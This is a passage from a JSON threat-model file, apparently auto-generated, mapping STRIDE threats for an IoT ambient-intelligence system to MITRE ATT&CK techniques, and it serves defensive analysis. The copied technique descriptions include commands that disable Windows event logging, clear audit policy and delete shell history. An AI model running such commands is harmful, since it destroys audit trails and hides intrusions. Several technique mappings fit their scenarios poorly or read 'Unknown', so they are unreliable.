                {
                    "Assumption": "Smart card data can be cloned.",
                    "Role": "Attacker",
                    "Condition": "Attacker has physical or network access to the smart card."
                },
                {
                    "Assumption": "No secondary verification like 2FA is in place.",
                    "Role": "System Designer",
                    "Condition": "System relies solely on smart card for authentication."
                }
            ],
            "Potential Impact": "Unauthorized access to the system, potential data breach, and malicious control of actuators.",
            "MITRE ATT&CK Keywords": [
                "smart card",
                "spoofing",
                "access control",
                "identity theft"
            ],
            "mitre_technique": {
                "name": "Peripheral Device Discovery",
                "description": "Adversaries may attempt to gather information about attached peripheral devices and components connected to a computer system.(Citation: Peripheral Discovery Linux)(Citation: Peripheral Discovery macOS) Peripheral devices could include auxiliary resources that support a variety of functionalities such as keyboards, printers, cameras, smart card readers, or removable storage. The information may be used to enhance their awareness of the system and network environment or may be used for further actions.",
                "id": "attack-pattern--348f1eef-964b-4eb6-bb53-69b3dcb0c643",
                "technique_id": "T1120"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker uses malicious software to impersonate a user's device and intercept communication with the system.",
            "Assumptions": [
                {
                    "Assumption": "Malware can be installed on user devices.",
                    "Role": "Attacker",
                    "Condition": "User device security is compromised."
                },
                {
                    "Assumption": "System accepts device credentials without strong mutual authentication.",
                    "Role": "System Designer",
                    "Condition": "Current system implementation uses weak device authentication."
                }
            ],
            "Potential Impact": "Intercepted data could lead to loss of confidentiality, integrity, and unauthorized actions.",
            "MITRE ATT&CK Keywords": [
                "device spoofing",
                "malware",
                "communication interception",
                "identity theft"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies data stored in cloud storage, altering system configurations.",
            "Assumptions": [
                {
                    "Assumption": "The cloud storage can be accessed without proper authorization.",
                    "Role": "Attacker",
                    "Condition": "Access control misconfiguration in cloud storage."
                },
                {
                    "Assumption": "No encryption or integrity checks on stored data.",
                    "Role": "System Designer",
                    "Condition": "Data stored in cloud is not encrypted or integrity-checked."
                }
            ],
            "Potential Impact": "Altered system configuration could lead to system malfunctions or unauthorized behaviors.",
            "MITRE ATT&CK Keywords": [
                "cloud storage",
                "data tampering",
                "configuration",
                "data integrity"
            ],
            "mitre_technique": {
                "name": "Data from Configuration Repository",
                "description": "Adversaries may collect data related to managed devices from configuration repositories. Configuration repositories are used by management systems in order to configure, manage, and control data on remote systems. Configuration repositories may also facilitate remote access and administration of devices.\n\nAdversaries may target these repositories in order to collect large quantities of sensitive system administration data. Data from configuration repositories may be exposed by various protocols and software and can store a wide variety of data, much of which may align with adversary Discovery objectives.(Citation: US-CERT-TA18-106A)(Citation: US-CERT TA17-156A SNMP Abuse 2017)",
                "id": "attack-pattern--0ad7bc5c-235a-4048-944b-3b286676cb74",
                "technique_id": "T1602"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker physically accesses and tampers with IoT sensors to feed incorrect data into the system.",
            "Assumptions": [
                {
                    "Assumption": "Physical access to sensors is possible.",
                    "Role": "Attacker",
                    "Condition": "Sensors are placed in easily accessible locations without proper physical safeguards."
                },
                {
                    "Assumption": "Sensors do not have tamper detection mechanisms.",
                    "Role": "System Designer",
                    "Condition": "System lacks sensors with tamper-detection capabilities."
                }
            ],
            "Potential Impact": "Incorrect sensor data leading to automated decisions that could be harmful or unsafe.",
            "MITRE ATT&CK Keywords": [
                "sensor tampering",
                "physical security",
                "data integrity",
                "incorrect data"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker exploits a vulnerability to alter the firmware of an IoT device, compromising its functionality.",
            "Assumptions": [
                {
                    "Assumption": "Firmware can be updated remotely.",
                    "Role": "Attacker",
                    "Condition": "Remote access to firmware update functionality is not properly secured."
                },
                {
                    "Assumption": "No validation mechanism for firmware updates.",
                    "Role": "System Designer",
                    "Condition": "System lacks digital signatures or other validation methods for firmware."
                }
            ],
            "Potential Impact": "Compromised device functionality, potential for data loss, or unauthorized device behavior.",
            "MITRE ATT&CK Keywords": [
                "firmware tampering",
                "remote update",
                "vulnerability",
                "device compromise"
            ],
            "mitre_technique": {
                "name": "Exploitation of Remote Services",
                "description": "Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.\n\nAn adversary may need to determine if the remote system is in a vulnerable state, which may be done through [Network Service Discovery](https://attack.mitre.org/techniques/T1046) or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.\n\nThere are several well-known vulnerabilities that exist in common services such as SMB (Citation: CIS Multiple SMB Vulnerabilities) and RDP (Citation: NVD CVE-2017-0176) as well as applications that may be used within internal networks such as MySQL (Citation: NVD CVE-2016-6662) and web server services.(Citation: NVD CVE-2014-7169)\n\nDepending on the permissions level of the vulnerable remote service an adversary may achieve [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068) as a result of lateral movement exploitation as well.",
                "id": "attack-pattern--9db0cf3a-a3c9-4012-8268-123b9db6fd82",
                "technique_id": "T1210"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies making changes to system configurations, leading to disputes.",
            "Assumptions": [
                {
                    "Assumption": "System lacks proper logging mechanisms.",
                    "Role": "System Designer",
                    "Condition": "Insufficient auditing and logging capabilities in the system."
                },
                {
                    "Assumption": "No user authentication on configuration changes.",
                    "Role": "System Designer",
                    "Condition": "System does not require strong authentication for configuration changes."
                }
            ],
            "Potential Impact": "Dispute over actions taken on the system, undermining trust in system reliability.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "logging",
                "audit",
                "configuration changes"
            ],
            "mitre_technique": {
                "name": "Disable Windows Event Logging",
                "description": "Adversaries may disable Windows event logging to limit data that can be leveraged for detections and audits. Windows event logs record user and system activity such as login attempts, process creation, and much more.(Citation: Windows Log Events) This data is used by security tools and analysts to generate detections.\n\nThe EventLog service maintains event logs from various system components and applications.(Citation: EventLog_Core_Technologies) By default, the service automatically starts when a system powers on. An audit policy, maintained by the Local Security Policy (secpol.msc), defines which system events the EventLog service logs. Security audit policy settings can be changed by running secpol.msc, then navigating to <code>Security Settings\\Local Policies\\Audit Policy</code> for basic audit policy settings or <code>Security Settings\\Advanced Audit Policy Configuration</code> for advanced audit policy settings.(Citation: Audit_Policy_Microsoft)(Citation: Advanced_sec_audit_policy_settings) <code>auditpol.exe</code> may also be used to set audit policies.(Citation: auditpol)\n\nAdversaries may target system-wide logging or just that of a particular application. For example, the Windows EventLog service may be disabled using the <code>Set-Service -Name EventLog -Status Stopped</code> or <code>sc config eventlog start=disabled</code> commands (followed by manually stopping the service using <code>Stop-Service  -Name EventLog</code>).(Citation: Disable_Win_Event_Logging)(Citation: disable_win_evt_logging) Additionally, the service may be disabled by modifying the \u201cStart\u201d value in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog</code> then restarting the system for the change to take effect.(Citation: disable_win_evt_logging)\n\nThere are several ways to disable the EventLog service via registry key modification. First, without Administrator privileges, adversaries may modify the \"Start\" value in the key <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Security</code>, then reboot the system to disable the Security EventLog.(Citation: winser19_file_overwrite_bug_twitter) Second, with Administrator privilege, adversaries may modify the same values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-System</code> and <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application</code> to disable the entire EventLog.(Citation: disable_win_evt_logging)\n\nAdditionally, adversaries may use <code>auditpol</code> and its sub-commands in a command prompt to disable auditing or clear the audit policy. To enable or disable a specified setting or audit category, adversaries may use the <code>/success</code> or <code>/failure</code> parameters. For example, <code>auditpol /set /category:\u201dAccount Logon\u201d /success:disable /failure:disable</code> turns off auditing for the Account Logon category.(Citation: auditpol.exe_STRONTIC)(Citation: T1562.002_redcanaryco) To clear the audit policy, adversaries may run the following lines: <code>auditpol /clear /y</code> or <code>auditpol /remove /allusers</code>.(Citation: T1562.002_redcanaryco)\n\nBy disabling Windows event logging, adversaries can operate while leaving less evidence of a compromise behind.",
                "id": "attack-pattern--4eb28bed-d11a-4641-9863-c2ac017d910a",
                "technique_id": "T1562.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker exploits a lack of proper logs to deny malicious activities performed within the system.",
            "Assumptions": [
                {
                    "Assumption": "System logs are not secure and are easily tampered with.",
                    "Role": "Attacker",
                    "Condition": "Weak log security mechanisms in place."
                },
                {
                    "Assumption": "No log encryption or integrity verification.",
                    "Role": "System Designer",
                    "Condition": "Logs are not encrypted or checked for integrity."
                }
            ],
            "Potential Impact": "Inability to trace malicious activities, leading to difficulty in forensic analysis.",
            "MITRE ATT&CK Keywords": [
                "log manipulation",
                "repudiation",
                "audit",
                "forensics"
            ],
            "mitre_technique": {
                "name": "Disable or Modify Cloud Logs",
                "description": "An adversary may disable or modify cloud logging capabilities and integrations to limit what data is collected on their activities and avoid detection. Cloud environments allow for collection and analysis of audit and application logs that provide insight into what activities a user does within the environment. If an adversary has sufficient permissions, they can disable or modify logging to avoid detection of their activities.\n\nFor example, in AWS an adversary may disable CloudWatch/CloudTrail integrations prior to conducting further malicious activity.(Citation: Following the CloudTrail: Generating strong AWS security signals with Sumo Logic) They may alternatively tamper with logging functionality \u2013 for example, by removing any associated SNS topics, disabling multi-region logging, or disabling settings that validate and/or encrypt log files.(Citation: AWS Update Trail)(Citation: Pacu Detection Disruption Module) In Office 365, an adversary may disable logging on mail collection activities for specific users by using the `Set-MailboxAuditBypassAssociation` cmdlet, by disabling M365 Advanced Auditing for the user, or by downgrading the user\u2019s license from an Enterprise E5 to an Enterprise E3 license.(Citation: Dark Reading Microsoft 365 Attacks 2021)",
                "id": "attack-pattern--cacc40da-4c9e-462c-80d5-fd70a178b12d",
                "technique_id": "T1562.008"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A malicious insider deletes log files to cover up unauthorized access to sensitive data.",
            "Assumptions": [
                {
                    "Assumption": "Insider has sufficient privileges to delete log files.",
                    "Role": "Insider",
                    "Condition": "Current access control model allows excessive permissions."
                },
                {
                    "Assumption": "No mechanisms to detect log deletions.",
                    "Role": "System Designer",
                    "Condition": "Lack of monitoring or alerting on log file deletions."
                }
            ],
            "Potential Impact": "Loss of audit trail, making it difficult to identify and respond to security incidents.",
            "MITRE ATT&CK Keywords": [
                "insider threat",
                "log deletion",
                "audit",
                "access control"
            ],
            "mitre_technique": {
                "name": "Clear Command History",
                "description": "In addition to clearing system logs, an adversary may clear the command history of a compromised account to conceal the actions undertaken during an intrusion. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done.\n\nOn Linux and macOS, these command histories can be accessed in a few different ways. While logged in, this command history is tracked in a file pointed to by the environment variable <code>HISTFILE</code>. When a user logs off a system, this information is flushed to a file in the user's home directory called <code>~/.bash_history</code>. The benefit of this is that it allows users to go back to commands they've used before in different sessions.\n\nAdversaries may delete their commands from these logs by manually clearing the history (<code>history -c</code>) or deleting the bash history file <code>rm ~/.bash_history</code>.  \n\nAdversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to clear command history data (<code>clear logging</code> and/or <code>clear history</code>).(Citation: US-CERT-TA18-106A)\n\nOn Windows hosts, PowerShell has two different command history providers: the built-in history and the command history managed by the <code>PSReadLine</code> module. The built-in history only tracks the commands used in the current session. This command history is not available to other sessions and is deleted when the session ends.\n\nThe <code>PSReadLine</code> command history tracks the commands used in all PowerShell sessions and writes them to a file (<code>$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt</code> by default). This history file is available to all sessions and contains all past history since the file is not deleted when the session ends.(Citation: Microsoft PowerShell Command History)\n\nAdversaries may run the PowerShell command <code>Clear-History</code> to flush the entire command history from a current PowerShell session. This, however, will not delete/flush the <code>ConsoleHost_history.txt</code> file. Adversaries may also delete the <code>ConsoleHost_history.txt</code> file or edit its contents to hide PowerShell commands they have run.(Citation: Sophos PowerShell command audit)(Citation: Sophos PowerShell Command History Forensics)",
                "id": "attack-pattern--3aef9463-9a7a-43ba-8957-a867e07c1e6a",
                "technique_id": "T1070.003"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive data intercepted during transmission between sensors and data repositories.",
            "Assumptions": [
                {
                    "Assumption": "Transmission is not encrypted.",
                    "Role": "System Designer",
                    "Condition": "Data is transmitted in plaintext."
                },
                {
                    "Assumption": "Attacker can access the communication channel.",
                    "Role": "Attacker",
                    "Condition": "Networks are inadequately secured."
                }
            ],
            "Potential Impact": "Confidentiality of user data is compromised, leading to potential misuse.",
            "MITRE ATT&CK Keywords": [
                "data interception",
                "information disclosure",
                "plaintext transmission",
                "network security"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Unauthorized access to sensitive data stored in cloud repositories due to misconfigurations.",
            "Assumptions": [
                {
                    "Assumption": "Cloud storage access controls are misconfigured.",
                    "Role": "System Admin",
                    "Condition": "Improperly set permissions or exposed services."
                },
                {
                    "Assumption": "No encryption for stored data.",
                    "Role": "System Designer",
                    "Condition": "Sensitive data stored without encryption."
                }
            ],
            "Potential Impact": "Exposure of sensitive user data, leading to privacy violations and potential data misuse.",
            "MITRE ATT&CK Keywords": [
                "cloud storage",
                "data exposure",
                "information disclosure",
                "access control"
            ],
            "mitre_technique": {
                "name": "Data from Cloud Storage",
                "description": "Adversaries may access data from cloud storage.\n\nMany IaaS providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. Similarly, SaaS enterprise platforms such as Office 365 and Google Workspace provide cloud-based document storage to users through services such as OneDrive and Google Drive, while SaaS application providers such as Slack, Confluence, Salesforce, and Dropbox may provide cloud storage solutions as a peripheral or primary use case of their platform. \n\nIn some cases, as with IaaS-based cloud storage, there exists no overarching application (such as SQL or Elasticsearch) with which to interact with the stored objects: instead, data from these solutions is retrieved directly though the [Cloud API](https://attack.mitre.org/techniques/T1059/009). In SaaS applications, adversaries may be able to collect this data directly from APIs or backend cloud storage objects, rather than through their front-end application or interface (i.e., [Data from Information Repositories](https://attack.mitre.org/techniques/T1213)). \n\nAdversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem.(Citation: Amazon S3 Security, 2019)(Citation: Microsoft Azure Storage Security, 2019)(Citation: Google Cloud Storage Best Practices, 2019) There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions.\n\nThis open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records.(Citation: Trend Micro S3 Exposed PII, 2017)(Citation: Wired Magecart S3 Buckets, 2019)(Citation: HIPAA Journal S3 Breach, 2017)(Citation: Rclone-mega-extortion_05_2021)\n\nAdversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain access to cloud storage objects.",
                "id": "attack-pattern--3298ce88-1628-43b1-87d9-0b5336b193d7",
                "technique_id": "T1530"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker exploits a vulnerability in user devices to extract sensitive information.",
            "Assumptions": [
                {
                    "Assumption": "User devices have exploitable vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Security vulnerabilities in user devices are not mitigated."
                },
                {
                    "Assumption": "Data on user devices is not encrypted.",
                    "Role": "User",
                    "Condition": "Sensitive data stored in plaintext on devices."
                }
            ],
            "Potential Impact": "Leakage of user-sensitive information, impacting privacy and security.",
            "MITRE ATT&CK Keywords": [
                "device vulnerability",
                "information disclosure",
                "data extraction",
                "privacy"
            ],
            "mitre_technique": {
                "name": "TCC Manipulation",
                "description": "Adversaries can manipulate or abuse the Transparency, Consent, & Control (TCC) service or database to execute malicious applications with elevated permissions. TCC is a Privacy & Security macOS control mechanism used to determine if the running process has permission to access the data or services protected by TCC, such as screen sharing, camera, microphone, or Full Disk Access (FDA).\n\nWhen an application requests to access data or a service protected by TCC, the TCC daemon (`tccd`) checks the TCC database, located at `/Library/Application Support/com.apple.TCC/TCC.db` (and `~/` equivalent), for existing permissions. If permissions do not exist, then the user is prompted to grant permission. Once permissions are granted, the database stores the application's permissions and will not prompt the user again unless reset. For example, when a web browser requests permissions to the user's webcam, once granted the web browser may not explicitly prompt the user again.(Citation: welivesecurity TCC)\n\nAdversaries may manipulate the TCC database or otherwise abuse the TCC service to execute malicious content. This can be done in various ways, including using privileged system applications to execute malicious payloads or manipulating the database to grant their application TCC permissions. \n\nFor example, adversaries can use Finder, which has FDA permissions by default, to execute malicious [AppleScript](https://attack.mitre.org/techniques/T1059/002) while preventing a user prompt. For a system without System Integrity Protection (SIP) enabled, adversaries have also manipulated the operating system to load an adversary controlled TCC database using environment variables and [Launchctl](https://attack.mitre.org/techniques/T1569/001).(Citation: TCC macOS bypass)(Citation: TCC Database)\n\nAdversaries may also opt to instead inject code (e.g., [Process Injection](https://attack.mitre.org/techniques/T1055)) into targeted applications with the desired TCC permissions.\n",
                "id": "attack-pattern--e8a0a025-3601-4755-abfb-8d08283329fb",
                "technique_id": "T1548.006"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker launches a DoS attack on the communication infrastructure, disrupting the operation of the AmI system.",
            "Assumptions": [
                {
                    "Assumption": "Infrastructure lacks adequate protections against traffic floods.",
                    "Role": "System Admin",
                    "Condition": "No network-level protections in place."
                },
                {
                    "Assumption": "Attack traffic cannot be easily distinguished from legitimate traffic.",
                    "Role": "Attacker",
                    "Condition": "Attacker can mimic legitimate traffic patterns."
                }
            ],
            "Potential Impact": "Disruption of system operations, affecting availability and reliability of the AmI environment.",
            "MITRE ATT&CK Keywords": [
                "DoS attack",
                "network disruption",
                "traffic flooding",
                "system availability"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "A malware infection in user devices spreads to the network, causing widespread denial of service.",
            "Assumptions": [
                {
                    "Assumption": "User devices lack adequate malware protection.",
                    "Role": "User",
                    "Condition": "User devices are not equipped with robust anti-malware solutions."
                },
                {
                    "Assumption": "Network lacks segmentation and isolation.",
                    "Role": "System Admin",
                    "Condition": "Flat network architecture without proper segmentation."
                }
            ],
            "Potential Impact": "System-wide disruption, making the AmI system unusable and affecting service availability.",
            "MITRE ATT&CK Keywords": [
                "malware",
                "DoS attack",
                "network infection",
                "system availability"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker exploits a vulnerability in IoT devices to remotely crash them.",
            "Assumptions": [
                {
                    "Assumption": "Devices have known vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Devices use out-of-date or vulnerable firmware/software."
                },
                {
                    "Assumption": "No patch management or regular updates.",
                    "Role": "System Admin",
                    "Condition": "System lacks a robust patch management process."
                }
            ],
            "Potential Impact": "Individual device failures leading to a degradation or complete loss of system services.",
            "MITRE ATT&CK Keywords": [
                "device crash",
                "DoS attack",
                "vulnerability exploitation",
                "system availability"
            ],
            "mitre_technique": {
                "name": "Endpoint Denial of Service",
                "description": "Adversaries may perform Endpoint Denial of Service (DoS) attacks to degrade or block the availability of services to users. Endpoint DoS can be performed by exhausting the system resources those services are hosted on or exploiting the system to cause a persistent crash condition. Example services include websites, email services, DNS, and web-based applications. Adversaries have been observed conducting DoS attacks for political purposes(Citation: FireEye OpPoisonedHandover February 2016) and to support other malicious activities, including distraction(Citation: FSISAC FraudNetDoS September 2012), hacktivism, and extortion.(Citation: Symantec DDoS October 2014)\n\nAn Endpoint DoS denies the availability of a service without saturating the network used to provide access to the service. Adversaries can target various layers of the application stack that is hosted on the system used to provide the service. These layers include the Operating Systems (OS), server applications such as web servers, DNS servers, databases, and the (typically web-based) applications that sit on top of them. Attacking each layer requires different techniques that take advantage of bottlenecks that are unique to the respective components. A DoS attack may be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\n\nTo perform DoS attacks against endpoint resources, several aspects apply to multiple methods, including IP address spoofing and botnets.\n\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\n\nBotnets are commonly used to conduct DDoS attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for DDoS, so many systems are used to generate requests that each one only needs to send out a small amount of traffic to produce enough volume to exhaust the target's resources. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)\n\nIn cases where traffic manipulation is used, there may be points in the global network (such as high traffic gateway routers) where packets can be altered and cause legitimate clients to execute code that directs network packets toward a target in high volume. This type of capability was previously used for the purposes of web censorship where client HTTP traffic was modified to include a reference to JavaScript that generated the DDoS code to overwhelm target web servers.(Citation: ArsTechnica Great Firewall of China)\n\nFor attacks attempting to saturate the providing network, see [Network Denial of Service](https://attack.mitre.org/techniques/T1498).\n",
                "id": "attack-pattern--c675646d-e204-4aa8-978d-e3d6d65885c4",
                "technique_id": "T1499"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "A user exploits a vulnerability in the system software to gain administrative privileges.",
            "Assumptions": [
                {
                    "Assumption": "System software has exploitable vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Vulnerabilities exist and are known to the attacker."
                },
                {
                    "Assumption": "No mitigations or controls in place.",
                    "Role": "System Admin",
                    "Condition": "Lack of mitigations such as privilege separation and effective patching."
                }
            ],
            "Potential Impact": "Complete control over the system, leading to unauthorized actions and potential malicious activities.",
            "MITRE ATT&CK Keywords": [
                "privilege escalation",
                "vulnerability exploitation",
                "administrative control",
                "system compromise"
            ],
            "mitre_technique": {
                "name": "Windows Service",
                "description": "Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions.(Citation: TechNet Services) Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry.\n\nAdversaries may install a new service or modify an existing service to execute at startup in order to persist on a system. Service configurations can be set or modified using system utilities (such as sc.exe), by directly modifying the Registry, or by interacting directly with the Windows API. \n\nAdversaries may also use services to install and execute malicious drivers. For example, after dropping a driver file (ex: `.sys`) to disk, the payload can be loaded and registered via [Native API](https://attack.mitre.org/techniques/T1106) functions such as `CreateServiceW()` (or manually via functions such as `ZwLoadDriver()` and `ZwSetValueKey()`), by creating the required service Registry values (i.e. [Modify Registry](https://attack.mitre.org/techniques/T1112)), or by using command-line utilities such as `PnPUtil.exe`.(Citation: Symantec W.32 Stuxnet Dossier)(Citation: Crowdstrike DriveSlayer February 2022)(Citation: Unit42 AcidBox June 2020) Adversaries may leverage these drivers as [Rootkit](https://attack.mitre.org/techniques/T1014)s to hide the presence of malicious activity on a system. Adversaries may also load a signed yet vulnerable driver onto a compromised machine (known as \"Bring Your Own Vulnerable Driver\" (BYOVD)) as part of [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020)\n\nServices may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges. Adversaries may also directly start services through [Service Execution](https://attack.mitre.org/techniques/T1569/002).\n\nTo make detection analysis more challenging, malicious services may also incorporate [Masquerade Task or Service](https://attack.mitre.org/techniques/T1036/004) (ex: using a service and/or payload name related to a legitimate OS or benign software component). Adversaries may also create \u2018hidden\u2019 services (i.e., [Hide Artifacts](https://attack.mitre.org/techniques/T1564)), for example by using the `sc sdset` command to set service permissions via the Service Descriptor Definition Language (SDDL). This may hide a Windows service from the view of standard service enumeration methods such as `Get-Service`, `sc query`, and `services.exe`.(Citation: SANS 1)(Citation: SANS 2)",
                "id": "attack-pattern--2959d63f-73fd-46a1-abd2-109d7dcede32",
                "technique_id": "T1543.003"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker uses social engineering to deceive a privileged user into revealing their credentials.",
            "Assumptions": [
                {
                    "Assumption": "Privileged users can be targeted and manipulated.",
                    "Role": "Attacker",
                    "Condition": "High-profile targets are susceptible to social engineering."
                },
                {
                    "Assumption": "No secondary authentication checks.",
                    "Role": "System Admin",
                    "Condition": "System relies on single-factor authentication for privileged access."
                }
            ],
            "Potential Impact": "Unauthorized access to critical system functions and sensitive data, potentially leading to extensive damage.",
            "MITRE ATT&CK Keywords": [
                "social engineering",
                "credential theft",
                "privilege escalation",
                "phishing"
            ],
            "mitre_technique": {
                "name": "Spearphishing Link",
